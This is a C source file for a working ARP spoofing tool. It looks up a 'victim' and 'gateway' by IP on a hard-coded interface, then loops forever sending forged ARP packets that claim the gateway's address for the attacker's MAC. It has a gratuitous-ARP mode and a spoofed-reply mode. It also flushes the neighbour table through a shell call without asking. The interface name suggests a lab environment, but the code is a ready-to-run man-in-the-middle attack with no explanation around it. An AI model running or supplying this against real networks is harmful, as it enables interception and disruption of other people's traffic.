#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <ifaddrs.h>


#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <netpacket/packet.h>
#include <netinet/if_ether.h>

#define ITS_IP "11.168.0.1"
#define YOUR_IP "11.168.0.2"
#define MY_IF "veth21"

int myifidx = -1;
uint32_t myaddr_be = 0;
uint8_t myhwaddr[6] = {0};
uint8_t ether_broadcast_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

int get_mac(int fd, struct ether_arp* req, uint32_t ip_addr){

	struct sockaddr_ll addr;

	memset(&addr, 0, sizeof(struct sockaddr_ll));
	addr.sll_family   = AF_PACKET;
	addr.sll_ifindex  = myifidx;
	addr.sll_halen    = ETHER_ADDR_LEN;
	addr.sll_protocol = htons(ETH_P_ARP);
	memcpy(addr.sll_addr, ether_broadcast_addr, ETHER_ADDR_LEN);

	req->arp_hrd = htons(ARPHRD_ETHER);
	req->arp_pro = htons(ETH_P_IP);
	req->arp_hln = ETHER_ADDR_LEN;
	req->arp_pln = sizeof(in_addr_t);
	req->arp_op  = htons(ARPOP_REQUEST);

	memset(&req->arp_tha, 0, sizeof(req->arp_tha));
	memcpy(&req->arp_tpa, &ip_addr, sizeof(req->arp_tpa));
	memcpy(&req->arp_sha, myhwaddr, sizeof(req->arp_sha));
	memcpy(&req->arp_spa, &myaddr_be, sizeof(req->arp_spa));

	if (sendto(fd, req, sizeof(struct ether_arp), 0, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
		printf("get_mac: error: sendto\n");
		return -1;
	}

	while (1) {

		int len = recv(fd, req, sizeof(struct ether_arp), 0);
		if (len == -1) {
			printf("get_mac: error: recv\n");
			return -1;
		}
		if (len == 0) { 
			continue;
		}		
		unsigned int from_addr =
			(req->arp_spa[3] << 24)
		      | (req->arp_spa[2] << 16)
		      | (req->arp_spa[1] << 8)
		      | (req->arp_spa[0] << 0);
		if (from_addr != ip_addr) {
			continue;
		}

		break;
	}
	return 0;
};


void do_spoof_g(int fd, uint8_t* my_mac, uint32_t its_ip, uint8_t* your_mac, uint32_t your_ip){
	struct ether_arp resp;
	struct sockaddr_ll addr;

	memset(&addr, 0, sizeof(struct sockaddr_ll));
	addr.sll_family         = AF_PACKET;
	addr.sll_ifindex        = myifidx;
	addr.sll_halen          = ETHER_ADDR_LEN;
	addr.sll_protocol       = htons(ETH_P_ARP);
	//memcpy(addr.sll_addr, your_mac, ETHER_ADDR_LEN);
	memcpy(addr.sll_addr, ether_broadcast_addr, ETHER_ADDR_LEN);

	resp.arp_hrd = htons(ARPHRD_ETHER);
	resp.arp_pro = htons(ETH_P_IP);
	resp.arp_hln = ETHER_ADDR_LEN;
	resp.arp_pln = sizeof(in_addr_t);
	resp.arp_op  = htons(ARPOP_REQUEST);

	memcpy(&resp.arp_sha, my_mac, sizeof(resp.arp_sha));
	memcpy(&resp.arp_spa, &its_ip,  sizeof(resp.arp_spa));
	memcpy(&resp.arp_tha, ether_broadcast_addr,   sizeof(resp.arp_tha));
	memcpy(&resp.arp_tpa, &its_ip,   sizeof(resp.arp_tpa));

	if (sendto(fd, &resp, sizeof(resp), 0, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
		printf("spoof: error: sendto\n");
	}
}


void do_spoof_ng(int fd, uint8_t* my_mac, uint32_t its_ip, uint8_t* your_mac, uint32_t your_ip){
	struct ether_arp resp;
	struct sockaddr_ll addr;

	memset(&addr, 0, sizeof(struct sockaddr_ll));
	addr.sll_family         = AF_PACKET;
	addr.sll_ifindex        = myifidx;
	addr.sll_halen          = ETHER_ADDR_LEN;
	addr.sll_protocol       = htons(ETH_P_ARP);
	memcpy(addr.sll_addr, your_mac, ETHER_ADDR_LEN);
	resp.arp_hrd = htons(ARPHRD_ETHER);
	resp.arp_pro = htons(ETH_P_IP);
	resp.arp_hln = ETHER_ADDR_LEN;
	resp.arp_pln = sizeof(in_addr_t);
	resp.arp_op  = htons(ARPOP_REPLY);

	memcpy(&resp.arp_sha, my_mac, sizeof(resp.arp_sha));
	memcpy(&resp.arp_spa, &its_ip,  sizeof(resp.arp_spa));
	memcpy(&resp.arp_tha, your_mac,   sizeof(resp.arp_tha));
	memcpy(&resp.arp_tpa, &your_ip,   sizeof(resp.arp_tpa));

	if (sendto(fd, &resp, sizeof(resp), 0, (struct sockaddr *) &addr, sizeof(addr)) == -1) {
		printf("spoof: error: sendto\n");
	}
}

void print_help(){
	printf("needs options:\n");
	printf("	- g : using gratuitous arp\n");
	printf("	- ng: using spoof packet\n");
}

int main(int argc, char** argv){

	int mode = 0;
	struct ifreq ifr;
	struct ether_arp your_ethinfo;
	struct ether_arp its_ethinfo;
	struct in_addr addr_tmp;

	system("ip neigh flush all");

	if(argc != 2){
		print_help();
		return -1;
	}

	if(strcmp(argv[1], "g") == 0){
		mode = 0;
	} else if (strcmp(argv[1], "ng") == 0){
		mode = 1;
	} else {
		printf("invalid argument\n");
		print_help();
		return -1;
	}

	memset(&ifr, 0, sizeof(struct ifreq));
	memset(&your_ethinfo, 0, sizeof(struct ether_arp));
	memset(&its_ethinfo, 0, sizeof(struct ether_arp));
	uint32_t its_ip_be = inet_addr(ITS_IP);
	uint32_t your_ip_be = inet_addr(YOUR_IP);

	int fd = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	if (fd < 0) {
		printf("failed to arp socket\n");
		return -1;
	}

	int if_name_len = strlen(MY_IF);
	memcpy(ifr.ifr_name, MY_IF, if_name_len);
	if(ioctl(fd, SIOCGIFINDEX, &ifr) == -1){
		printf("failed to get if index\n");
		return -1;
	}
	myifidx = ifr.ifr_ifindex;
	if(ioctl(fd, SIOCGIFADDR, &ifr) == -1) {
		printf("failed to get if addr\n");
		return -1;
	}
	memcpy(&myaddr_be, ifr.ifr_addr.sa_data + 2, 4);
	if(ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
		printf("failed to get if hw addr\n");
		return -1;
	}
	memcpy(myhwaddr, ifr.ifr_hwaddr.sa_data, 6);
	addr_tmp.s_addr = myaddr_be;
	printf("my: ifidx: %d ip: %s hw: %02x %02x %02x %02x %02x %02x\n", myifidx, inet_ntoa(addr_tmp), 
		myhwaddr[0],
		myhwaddr[1],
		myhwaddr[2],
		myhwaddr[3],
		myhwaddr[4],
		myhwaddr[5]
	);
	if(get_mac(fd, &your_ethinfo, your_ip_be) < 0){
		printf("failed to get the victim hw info\n");
		return -1;
	}
	memcpy(&addr_tmp.s_addr, your_ethinfo.arp_spa, 4);
	printf("victim: ip: %s hw: %02x %02x %02x %02x %02x %02x\n", inet_ntoa(addr_tmp), 
		your_ethinfo.arp_sha[0],
		your_ethinfo.arp_sha[1],
		your_ethinfo.arp_sha[2],
		your_ethinfo.arp_sha[3],
		your_ethinfo.arp_sha[4],
		your_ethinfo.arp_sha[5]
	);
	if(get_mac(fd, &its_ethinfo, its_ip_be) < 0){
		printf("failed to get gateway hw info\n");
		return -2;
	}
	memcpy(&addr_tmp.s_addr, its_ethinfo.arp_spa, 4);
	printf("gateway: ip: %s hw: %02x %02x %02x %02x %02x %02x\n", inet_ntoa(addr_tmp), 
		its_ethinfo.arp_sha[0],
		its_ethinfo.arp_sha[1],
		its_ethinfo.arp_sha[2],
		its_ethinfo.arp_sha[3],
		its_ethinfo.arp_sha[4],
		its_ethinfo.arp_sha[5]
	);

	char enter[8] = {0};
	printf("spoofing? ");
	fgets(enter, 8, stdin);

	while(1){
		if(mode == 0){
			do_spoof_g(fd, myhwaddr, its_ip_be, your_ethinfo.arp_sha, your_ip_be);
			printf("gratuitous arp...\n");
		} else {
			do_spoof_ng(fd, myhwaddr, its_ip_be, your_ethinfo.arp_sha, your_ip_be);
			printf("spoofing...\n");
		}
		sleep(1);
	}

	printf("exit\n");
    return 0;
}